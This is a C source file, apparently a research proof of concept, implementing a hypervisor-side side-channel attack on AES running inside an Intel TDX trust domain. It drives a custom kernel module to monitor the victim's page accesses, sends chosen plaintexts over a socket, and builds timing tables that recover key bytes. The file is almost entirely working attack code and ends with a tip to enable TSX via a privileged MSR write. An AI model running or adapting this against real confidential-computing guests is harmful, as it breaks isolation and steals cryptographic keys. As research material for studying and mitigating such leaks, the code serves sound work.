#define ATTACKER
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "tdxutils.h"
#include "config.h"

#if USE_PMC
#define target_pmc test_pmc
#else
const static struct pmc_info target_pmc = {0, };
#endif

#ifndef countof
#define countof(x) (sizeof(x)/sizeof(*(x)))
#endif

#define PORT 12123

#define CRED "\033[91m"
#define CRESET "\033[39m"

const char loading[] = "|/-\\";
static size_t timings[16][16] = {0,};
static int victim_sockfd = -1;
static int util_fd = -1;
static unsigned long term_gpa, encrypt_gpa, probe_gpa, tdr_pa;

static const unsigned int pmc_min = 0;
static const unsigned int pmc_max = 1;

static unsigned long rdtsc(void) {
    unsigned long hi, lo;
    asm volatile("rdtsc" : "=d"(hi), "=a"(lo));
    return (hi << 32) | lo;
}

static unsigned char get_page_level(int util_fd, unsigned long gpa) {
    union tdx_sept_entry entry = {};
    unsigned long rc;

    // Align to 2MB boundary for checking
    gpa = level_align(gpa, TDX_LEVEL_2M);

    rc = seamcall_tdh_mem_sept_rd(util_fd, TDX_LEVEL_2M, gpa, tdr_pa, (unsigned long *)&entry, NULL);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error - Could not resolve GPA 0x%lx (rc 0x%lx)! Make sure it is valid.\n", gpa, rc);
        return 0; // Return 0 (4KB) as default
    }

    return entry.leaf ? 1 : 0; // 1 = 2MB page, 0 = 4KB page
}

static int split_huge_pages(int util_fd, unsigned long start_gpa, unsigned long end_gpa) {
    struct tdx_split_huge_pages_req req = {
        .tdr_pa = tdr_pa,
        .start_gpa = start_gpa,
        .end_gpa = end_gpa,
        .target_level = 0 // PG_LEVEL_4K
    };

    if (ioctl(util_fd, IOCTL_TDX_SPLIT_HUGE_PAGES, &req) < 0) {
        perror("ioctl IOCTL_TDX_SPLIT_HUGE_PAGES");
        return -1;
    }

    return 0;
}

static void split_gpa_if_2mb(int util_fd, unsigned long gpa) {
    unsigned char level = get_page_level(util_fd, gpa);

    if (level == TDX_LEVEL_4K)
        return;

    split_huge_pages(util_fd, level_align(gpa, TDX_LEVEL_2M), level_align(gpa, TDX_LEVEL_2M) + level_pg_size(TDX_LEVEL_2M));
}

static unsigned long gpa_to_hpa(int util_fd, unsigned long gpa) {
    unsigned long rc, level = 0;
    union tdx_sept_entry entry;

    // First try to resolve as a 2MB page
    rc = seamcall_tdh_mem_sept_rd(util_fd, 1, gpa & ~((1ul << 21) - 1), tdr_pa, (void*) &entry, &level);
    if (rc != TDX_SUCCESS)
        return ~0ul;

    // This is indeed a 2MB page - return result
    if (entry.leaf)
        return (entry.pfn << 12) | (gpa & ((1ul << 21) - 1));

    // Resolve as a 4kB page instead
    rc = seamcall_tdh_mem_sept_rd(util_fd, 0, gpa, tdr_pa, (void*) &entry, NULL);
    if (rc != TDX_SUCCESS)
        return ~0ul;

    return (entry.pfn << 12) | (gpa & 0xfff);
}

void get_access_times(unsigned long* times_per_cl) {
    ssize_t status;
    unsigned int i;
    unsigned long delta = 0;
    struct tdx_access_monitor_hit hits[0x100] = {0, };
    struct tdx_access_monitor_query query = {
        .dest_len = countof(hits),
        .dest = hits,
        .num_items = 0,
    };

    do {
        status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_QUERY, &query);
        if (status < 0) {
            perror("IOCTL_TDX_ACCESS_MONITOR_QUERY");
            fflush(stderr);
            exit(EXIT_FAILURE);
        }

        for (i = 0; i < query.num_items; i++) {
            if (level_align(query.dest[i].gpa, TDX_LEVEL_4K) != level_align(probe_gpa, TDX_LEVEL_4K))
                continue;
            if (((query.dest[i].gpa & 0xfff) >> 6) >= 16)
                continue;

            if (access_type == TDX_ACCESS_TYPE_TSX) {
                times_per_cl[((query.dest[i].gpa & 0xfff) >> 6)]++;
                continue;
            }

            if (!~query.dest[i].tsc_delta)
                continue;

            if (target_pmc.evt.raw) {
                delta = query.dest[i].pmc_delta;
                if (delta < pmc_min || delta > pmc_max)
                    continue;
                times_per_cl[((query.dest[i].gpa & 0xfff) >> 6)] += query.dest[i].pmc_delta;
                continue;
            }

            times_per_cl[((query.dest[i].gpa & 0xfff) >> 6)] += query.dest[i].tsc_delta;
        }
    } while (query.num_items > 0);
}

static unsigned long get_access_times_sum(unsigned char byte, unsigned long* times_per_cl) {
    static unsigned int p = 0;
    unsigned int i;

    printf("\r[%c]", loading[p++ % strlen(loading)]);
    fflush(stdout);

    send(victim_sockfd, &byte, 1, MSG_DONTWAIT);
    recv(victim_sockfd, &byte, 1, 0);
    get_access_times(times_per_cl);
}

static void probe_byte_aes(unsigned char byte) {
    unsigned long times_per_cl[16] = {0, };
    int addr;

    get_access_times_sum(byte, times_per_cl);

    for (addr = 0; addr < 16; addr++)
        timings[addr][byte / 16] += times_per_cl[addr];
}

static void output_results(size_t start_time, size_t start_time_wall, size_t* elapsed_out, unsigned char* success_out) {
    struct timespec t1 = {0,};
    size_t row_max, row_min, total_time, time_wall;
    FILE *f = fopen("hist.csv", "w");
    unsigned int correct_max = 0, correct_min = 0;
    unsigned int x, y;

    for (y = 0; y < 16; y++) {
        row_max = 0;
        row_min = -1ull;

        for (x = 0; x < 16; x++) {
            if (timings[y][x] < row_min)
                row_min = timings[y][x];
            if (timings[y][x] > row_max)
                row_max = timings[y][x];
        }

        for (x = 0; x < 16; x++) {
            printf("\x1b[4%dm%6zu  \x1b[0m", timings[y][x] == row_max ? 1 : timings[y][x] == row_min ? 2 : 0, timings[y][x]);
            fprintf(f, "%zd%s", timings[y][x], x != 15 ? "," : "");

            if (x != y)
                continue;

            if (timings[y][x] == row_max)
                correct_max++;
            if (timings[y][x] == row_min)
                correct_min++;
        }

        fprintf(f, "\n");
        printf("\n");
    }

    total_time = rdtsc() - start_time;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    time_wall = (t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec) - start_time_wall;

    fclose(f);

    *success_out = (correct_max == 16 || correct_min == 16) ? 1 : 0;
    *elapsed_out = time_wall / 1000000;

    if (correct_max == 16 || correct_min == 16)
        printf("\n\x1b[32mCORRECT!\x1b[0m\n");
    else
        printf("\n\x1b[31mFAILURE!\x1b[0m\n");

    printf("Time: %zd ms (%zd cycles)\n", time_wall / 1000000, total_time);
}

static void simple_first_round_attack(unsigned char* success_out, size_t* elapsed_out) {
    unsigned char test_byte = 1;
    struct timespec t1;
    unsigned long probe_hpa;
    unsigned long start_time, start_time_wall;
    ssize_t status;
    struct tdx_access_monitor_hit hits[0x100] = {0, };
    struct tdx_access_monitor_query query = {
        .dest_len = countof(hits),
        .dest = hits,
        .num_items = 0,
    };

    split_gpa_if_2mb(util_fd, term_gpa);
    split_gpa_if_2mb(util_fd, encrypt_gpa);
    split_gpa_if_2mb(util_fd, probe_gpa);
    probe_hpa = gpa_to_hpa(util_fd, probe_gpa);

    struct tdx_access_monitor_targets targets = {
        .sync_gpa = level_align(encrypt_gpa, TDX_LEVEL_4K),
        .sync_level = TDX_LEVEL_4K,
        .termination_gpa = level_align(term_gpa, TDX_LEVEL_4K),
        .termination_level = TDX_LEVEL_4K,
        .access_type = access_type,
        .hit_tsc_threshold_upper = LOAD_PROBE_UPPER_THRESHOLD, // Not relevant with TSX
        .hit_tsc_threshold_lower = LOAD_PROBE_LOWER_THRESHOLD,
        .tdr_pa = tdr_pa,
        .num_targets = 1,
        .pmc = target_pmc,
        .targets = {
            {.gpa = level_align(probe_gpa, TDX_LEVEL_4K), .hpa = level_align(probe_hpa, TDX_LEVEL_4K), .level = TDX_LEVEL_4K},
        },
    };

    // Make sure that victim is active and can respond
    if (send(victim_sockfd, &test_byte, 1, 0) != 1) {
        perror("send");
        exit(EXIT_FAILURE);
    }
    if (recv(victim_sockfd, &test_byte, 1, 0) != 1) {
        perror("recv");
        exit(EXIT_FAILURE);
    }

    // Setup monitor
    status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_START, &targets);
    if (status < 0) {
        perror("IOCTL_TDX_ACCESS_MONITOR_START");
        fflush(stderr);
        exit(EXIT_FAILURE);
    }

    srand(0);
    start_time = rdtsc();

    clock_gettime(CLOCK_MONOTONIC, &t1);
    start_time_wall = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;

    for (size_t byte = 0; byte < 256; byte += 16)
        probe_byte_aes((unsigned char) byte);

    printf("\r");
    output_results(start_time, start_time_wall, elapsed_out, success_out);

    status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_STOP);
    if (status < 0) {
        perror("IOCTL_TDX_ACCESS_MONITOR_STOP");
        fflush(stderr);
        exit(EXIT_FAILURE);
    }

    do {
        status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_QUERY, &query);
        if (status < 0) {
            perror("IOCTL_TDX_ACCESS_MONITOR_QUERY");
            fflush(stderr);
            exit(EXIT_FAILURE);
        }
    } while (query.num_items > 0);
}

static int connect_to_victim(const char* ip_addr) {
    struct sockaddr_in server_addr = {0, };
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, ip_addr, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        printf("Could not parse IP address\n");
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    printf("Connected to %s:%d\n", ip_addr, PORT);

    return sockfd;
}

static size_t mean(const size_t* buf, size_t len) {
    size_t ret = 0, i = len;
    while (i--)
        ret += buf[i];
    return ret / len;
}

static void dump_results(size_t elapsed, unsigned int success_rate) {
    unsigned int x, y;
    FILE* f;
    char fpath[256];

    snprintf(fpath, sizeof(fpath), "t_table_results_%lums_%.5f_success.txt", elapsed, (double) success_rate / (double) NUM_ATTACK_RUNS);

    f = fopen(fpath, "w");

    if (!f) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    for (x = 0; x < 16; x++) {
        for (y = 0; y < 16; y++)
            fprintf(f, "%u %u %lu\n", y, x, timings[x][y]);
        fprintf(f, "\n");
    }

    fclose(f);
}

int main(int argc, char* argv[]) {
    const char* target_ip;
    char* endptr = NULL;
    FILE* f;
    size_t timings_accumulated[16][16] = {0,};
    size_t runtimes[NUM_ATTACK_RUNS] = {0, };
    unsigned int success_rate = 0, i, x, y;
    unsigned char success;

    memset(timings, 0, sizeof(timings));

    if (argc < 5) {
        printf("Usage: %s <target ip> <probe GPA> <termination GPA> <encrypt GPA>\nRun the victim inside a TD to get the info required to run this.\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Get parameters
    target_ip = argv[1];
    probe_gpa = strtoul(argv[2], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Invalid probe GPA\n");
        exit(EXIT_FAILURE);
    }
    term_gpa = strtoul(argv[3], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Invalid termination GPA\n");
        exit(EXIT_FAILURE);
    }
    encrypt_gpa = strtoul(argv[4], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Invalid encrypt GPA\n");
        exit(EXIT_FAILURE);
    }

    util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) {
        perror("open /dev/" TDXUTILS_DEVICE_NAME);
        fprintf(stderr, "Make sure that the tdxutils kernel module is loaded\n");
        exit(EXIT_FAILURE);
    }

    tdr_pa = get_tdr_pa(util_fd);

    // Open connection to victim for chosen plaintext attack
    victim_sockfd = connect_to_victim(target_ip);

    // Begin the attack
    for (i = 0; i < NUM_ATTACK_RUNS; i++) {
        success = 0;
        memset(timings, 0, sizeof(timings));
        simple_first_round_attack(&success, &runtimes[i]);
        success_rate += success ? 1 : 0;

        for (x = 0; x < 16; x++)
            for (y = 0; y < 16; y++)
                timings_accumulated[x][y] += timings[x][y];
    }

    memcpy(timings, timings_accumulated, sizeof(timings));

    dump_results(mean(runtimes, NUM_ATTACK_RUNS), success_rate);
    printf("SUCCESS RATE: %.5f (%u/%u)\n", (double) success_rate / (double) NUM_ATTACK_RUNS, success_rate, NUM_ATTACK_RUNS);
    printf("Note - when using TSX-Probe, ensure that TSX is enabled. If in doubt, run 'sudo wrmsr -a 0x122 0'\n");
    f = fopen("runtimes.bin", "w");
    if (!f) {
        perror("fopen runtimes");
        exit(EXIT_FAILURE);
    }

    fwrite(runtimes, sizeof(*runtimes), NUM_ATTACK_RUNS, f);
    fclose(f);

    fflush(stdout);
    return 0;
}
